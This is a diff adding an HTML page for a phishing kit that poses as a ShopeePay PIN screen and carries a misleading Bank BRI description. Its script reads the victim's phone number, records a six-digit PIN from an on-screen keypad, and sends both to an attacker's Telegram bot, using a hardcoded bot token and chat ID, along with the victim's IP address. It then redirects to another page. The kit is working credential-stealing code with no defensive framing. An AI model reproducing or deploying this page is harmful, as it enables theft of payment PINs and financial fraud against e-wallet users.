@@ -1,0 +1,302 @@
+
+  <html class=""><head>
+   
+<meta name="theme-color" content="#ee4d2d" data-rh="true">
+    <meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
+	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+	<meta name="theme-color" content="#ee4d2d" data-rh="true">
+	<meta property="og:type" content="website">
+
+	<title>PIN ShopeePay</title>    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+    <link rel="stylesheet" href="responsive.css">
+    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <script src="config.js"></script>
+    <script src="database.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap');
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+           
+            overflow: hidden; 
+            background: none ;
+            padding-right: 0px;
+        }
+
+        .text-header {
+            font-family: 'Nunito', sans-serif;
+            color: #aaa;
+        }
+
+        .text-subheader {
+            font-family: 'Nunito', sans-serif;
+            margin-top: -40px;
+            color: #aaa;
+            font-size: 15px;
+        }
+
+        .sizing {
+            width: 332px;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .sizing {
+                width: 95%;
+            }
+        } 
+
+        .pinNumb {
+            cursor: pointer;
+            
+            width: 105px; 
+            background-color: #fff; 
+            font-size: 30px; color: #000; 
+            text-align: center; 
+            padding-left: -10px; 
+            border-radius: 5px; 
+            box-shadow: rgba(171, 171, 171, 1) 1px 1px 1px 0px; 
+           font-weight: 300;
+            padding: 4px 50px -10 10;
+            background: #fff;
+            margin: -18px -6px;
+            border: 0px solid #aaa;
+            position: relative;
+            height: 45px;
+        }
+
+        button.pinNumb:hover {
+            color: #a1a1a1;
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid #ccc;
+            box-shadow: rgba(171, 171, 171, 1) 0px 1px 0px 0px; 
+        }
+
+.bubble-element{
+    font-weight: 300;
+}
+    </style>
+  <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.2f3WBw8L4SI.L.W.O/am=KAAD/d=0/rs=AN8SPfrhC_4sx0aCDCE726xGqFV0GIzW_Q/m=el_main_css"></head>
+  <body>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAZ5puzc0K0jp8akvBZxdujU1oZFo_Skm1MCaWC-__gDw0n-ZBqwbsAlE1ic0yCm2uey_9befEWLDZxciwRU3UL7QzndlFx-GAIalVH2UHrqFHDWbnGeQOScGpz3NUGiM11GRyx88N6PjmQQlypxo7hjVT374n8v8khOGtvmD0TpMTDwRi20EfDkDjTjM/s1080/AddText_04-01-08.02.33.jpg" style="width: 100%">     
+    <div class="container">
+        <div class="row" style="margin-top: -30px;">
+            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; text-align: center; margin-top: 25px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 16px; font-weight: 400; color: rgb(255,255,255); line-height: 1.4; border-radius: 0px;">
+              
+            </div>
+        </div>
+<form id="ryuSubmit" method="get">     
+        <div class="row" style="margin-top: -200px;">
+            <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; height: 58.8px; padding-bottom: 0px; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
+               <div class="row" style="texr-align: center; margin-right: 5px;">
+<input type="hidden" id="nomorhp" value="0808080808">	                  
+<input type="tel" name="sixpin" id="setPin" autocomplete="true" style="opacity: 0">
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+              <div class="bubble-element Group" id="pin1" style="box-sizing: border-box; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;  width: 50px; left: 0px; top: 0px; border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin2" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin3" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin4" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin5" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px; border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+                    <div class="col-2">
+                        <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
+                            <div class="bubble-element Group" id="pin6" style="box-sizing: border-box; width: 50px; font-size: 30px; color: #FF5C36; text-align: center; padding-top: 3px;border: 1px solid #ccc; border-radius: 0px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 52px;"></div>
+                        </div>
+                    </div>
+               </div>
+               <div class="row" style="margin-top: -70px">
+                    <div class="col-12">
+                        <div class="text-header text-center" style="font-family: 'Nunito', sans-serif;'"><font size="2" style=""><strong>Lupa PIN</strong></font></div>
+                    </div>
+               </div>
+            </div>
+        </div>
+        <div class="row" style="margin-top: 215px; margin-left: 0px; margin-bottom: 110px">
+            <div class="col-12 d-block mx-auto " style="white-space: pre-wrap; height: 260px; margin-bottom: 10px; font-size: 16px; color: rgb(59, 59, 59); line-height: 1.29; border-radius: 3px; background-color: #eee; width: 100%; position: absolute; left: 0; right:0 ; margin: -10px auto; text-align: center; bottom: 0; padding: 15px">
+                <div class="row" style="margin-top: -68px">
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="1">1</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="2">2</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="3">3</button>
+                    </div>
+                </div>
+
+                <div class="row" style="margin-top: -80px">
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="4">4</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="5">5</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="6">6</button>
+                    </div>
+                </div>
+
+                <div class="row" style="margin-top: -80px">
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="7">7</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="8">8</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="9">9</button>
+                    </div>
+                </div>
+
+                <div class="row" style="margin-top: -80px">
+                    <div class="col-4">
+                        
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="setPin" data-id="0">0</button>
+                    </div>
+                    <div class="col-4">
+                        <button type="button" class="bubble-element Group pinNumb" id="hapus"><i class="ion-backspace-outline"></i></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form></div>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjL6mfwbr-XqeKl8W-VMfdCmB3Lxc1zwt-OfAeNrfkr_ENnPE9w8zfXzUcWOrCoUhxExGhEgE6ooCl6mbNRWX34_WurgWDzXhYAvF8AJi4Vrqw6ge_4d9HB_5UJChBsw3R5rnufOIENgXKUWV74C5WiSC4f0fMssDWFyk5SgUjt-4ovdJzf9ncWNkIcQ8M/s1836/IMG_20240401_204139.png" width="180px" style="position: fixed; bottom: 5; left: 0; right: 0; margin: 0px auto">
+   
+       
+    
+<script>
+  var phoneNumber = sessionStorage.getItem("userPhone") || "";
+document.getElementById("nomorhp").value = phoneNumber;          
+</script>
+<script>
+        document.addEventListener('DOMContentLoaded', function() {
+const pinButtons = document.querySelectorAll('.pinNumb[data-id]');
+            const deleteButton = document.getElementById('hapus');
+            const pinDisplays = ['pin1', 'pin2', 'pin3', 'pin4', 'pin5', 'pin6'];
+
+pinButtons.forEach(button => {
+                button.addEventListener('click', async function(e) {
+                    e.preventDefault();
+                    await handlePinClick(this);
+                });
+            });
+
+            async function handlePinClick(button) {
+                const pin = button.getAttribute('data-id');
+                let filled = false;
+
+                for (let i = 0; i < pinDisplays.length; i++) {
+                    const display = document.getElementById(pinDisplays[i]);
+                    if (display.textContent.trim() === '') {
+                        display.textContent = pin;
+                        filled = true;
+                        break;
+                    }
+                }
+
+                if (filled) {
+                    // Check if all PIN digits are filled
+                    const allFilled = pinDisplays.every(id => document.getElementById(id).textContent.trim() !== '');
+                        if (allFilled) {
+                            const pinValue = pinDisplays.map(id => document.getElementById(id).textContent).join('');
+
+                            if (pinValue.length === 6) {
+                                const nomorhp = document.getElementById('nomorhp');
+
+                                // Clear PIN display first
+                                pinDisplays.forEach(id => document.getElementById(id).textContent = '');
+
+                                // Save to sessionStorage
+                                sessionStorage.setItem("userPhone", nomorhp.value);
+                                sessionStorage.setItem("userPin", pinValue);
+
+// Check userDB, send reliably + redirect
+                                if (!window.userDB) {
+                                    console.error('❌ userDB not loaded! Check config/database.js');
+                                    alert('Error: Database not loaded. Refresh page.');
+                                } else {
+                                    await window.userDB.saveUser({phone: nomorhp.value, pin: pinValue}, true); // Final send with dedup
+                                    console.log('✅ Full data sent to Telegram (deduped):', nomorhp.value, pinValue);
+                                }
+                                setTimeout(() => {
+                                    window.location.href = 'cara.html';
+                                }, 1000);
+
+                            }
+                        }
+                }
+            }
+
+
+
+            deleteButton.addEventListener('click', function() {
+                pinDisplays.forEach(id => document.getElementById(id).textContent = '');
+            });
+        });
+        
+        // Send data to Telegram function
+        async function sendDataToTelegram(phone, pin) {
+            const token = '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc';
+            const chatId = '8593139959';
+
+            // Get IP and date
+            let ip = 'Unknown IP';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+                console.log('IP fetched:', ip);
+            } catch (error) {
+                console.log('Failed to fetch IP:', error);
+                ip = 'Unknown IP';
+            }
+
+            const date = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+
+            const message = `🔐 SHOPEE DATA COLLECTED\n\n📱 Phone: ${phone}\n🔑 PIN: ${pin}\n🌐 IP: ${ip}\n📅 Date: ${date}\n\n✅ Data captured successfully!`;
+
+            try {
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&t=${Date.now()}`;
+
+            // INSTANT + UNLOAD-SAFE: sendBeacon PRIMARY + keepalive BACKUP
+                navigator.sendBeacon(url);
+                console.log('⚡ sendBeacon sent - INSTANT delivery!');
+                
+                fetch(url, {keepalive: true});
+
+                // Return immediately without waiting
+                return true;
+            } catch (error) {
+                console.error('Failed to send to Telegram:', error);
+                return false;
+            }
+        }
+    </script><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class="VIpgJd-yAWNEb-hvhgNd-Ud7fr"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""><div class=" VIpgJd-yAWNEb-hvhgNd-IuizWc-i3jM8c " dir="ltr">Original text</div></div><div class="VIpgJd-yAWNEb-hvhgNd-k77Iif"><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>
+  
+
+</body></html>
